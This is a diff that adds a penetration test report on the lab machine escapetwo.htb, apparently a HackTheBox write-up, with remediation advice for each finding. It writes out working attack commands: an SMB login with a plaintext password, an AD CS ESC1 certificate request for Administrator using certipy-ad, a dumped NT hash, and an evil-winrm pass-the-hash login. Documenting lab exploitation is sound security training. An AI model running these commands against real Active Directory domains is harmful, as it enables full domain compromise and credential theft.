@@ -1,0 +1,100 @@
+## Red Team Penetration Testing Report
+
+### Overview
+This report documents the security weaknesses identified during the assessment of `escapetwo.htb`. The engagement led to privilege escalation from an initial foothold to full domain compromise.
+
+---
+
+## Findings and Recommendations
+
+### Finding 1: **Open Network Ports and Services**
+#### Identified Ports:
+```bash
+PORT     STATE SERVICE        VERSION
+53/tcp   open  domain         Microsoft DNS
+80/tcp   open  http           Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec   Microsoft Windows Kerberos (server time: 2025-03-22 10:15:24 UTC)
+135/tcp  open  msrpc          Microsoft Windows RPC
+139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
+389/tcp  open  ldap           Microsoft Windows Active Directory LDAP (Domain: escapetwo.htb)
+445/tcp  open  microsoft-ds   Windows Server SMB
+3389/tcp open  ms-wbt-server  Microsoft Terminal Services
+```
+
+#### Risk Rating:
+- **High**: SMB and LDAP services are exposed, increasing the attack surface for authentication-based attacks.
+- **Medium**: Web service on port 80 could be susceptible to web-based vulnerabilities.
+
+#### Recommendations:
+- Restrict access to SMB (445/tcp) to internal users only.
+- Enforce stronger authentication mechanisms for LDAP and Kerberos.
+- Conduct security assessments on the web service hosted on IIS.
+
+---
+
+### Finding 2: **SMB Share Access and File Retrieval**
+#### SMB Authentication:
+```bash
+smbclient -L //10.10.11.51 -U rose%KxEPkKe6R8su
+```
+#### Retrieved Files:
+```
+| Share Name            | Permissions | File Name            | Status                         |
+|-----------------------|-------------|----------------------|--------------------------------|
+| Accounting_Department | READ        | accounting_2024.xlsx | Retrieved successfully         |
+| Users                 | READ        | Desktop/Documents    | Accessed but no sensitive data |
+```
+#### Risk Rating:
+- **High**: Access to financial data in `accounting_2024.xlsx` presents a data leakage risk.
+- **Medium**: User directories may contain additional sensitive data if not secured properly.
+
+#### Recommendations:
+- Restrict access to sensitive shares, limiting user permissions based on role.
+- Enable auditing for SMB access to detect unauthorized attempts.
+
+---
+
+### Finding 3: **Privilege Escalation via Active Directory Certificate Services (AD CS)**
+#### Vulnerable Certificate Template Identified:
+```bash
+certipy-ad find -u sql_svc@escapetwo.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
+```
+- **DunderMifflinAuthentication** template was found vulnerable to ESC1, ESC2, ESC3, and ESC4.
+- Allowed requesting a certificate for **Administrator@escapetwo.htb**, enabling full domain compromise.
+
+#### Exploitation Process:
+```bash
+certipy-ad req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca escapetwo-DC01-CA -target DC01.escapetwo.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@escapetwo.htb
+```
+
+#### Risk Rating:
+- **Critical**: Misconfigured AD CS template allowed privilege escalation to **Domain Admin**.
+
+#### Recommendations:
+- Remove the ability for standard users to request certificates for privileged accounts.
+- Restrict `Enrollee Supplies Subject` from all templates to prevent arbitrary certificate requests.
+- Regularly audit AD CS templates and implement principle of least privilege.
+
+---
+
+### Finding 4: **Compromise of Administrator Account**
+#### Retrieved NT Hash:
+```bash
+Got hash for 'administrator@escapetwo.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
+#### Remote Access Obtained:
+```bash
+evil-winrm -i 10.10.11.51 -u Administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
+```
+#### Risk Rating:
+- **Critical**: Full compromise of the domain controller.
+
+#### Recommendations:
+- Immediately reset the Administrator account password.
+- Disable NTLM authentication and enforce Kerberos-only authentication.
+- Monitor logs for unauthorized WinRM connections.
+
+---
+
+## Conclusion
+The penetration test revealed multiple vulnerabilities, including open network services, insecure SMB shares, and misconfigured Active Directory Certificate Services. The exploitation chain led to full domain compromise, demonstrating the need for stringent security measures. Implementing the recommended mitigations will significantly enhance the security posture of `escapetwo.htb`.
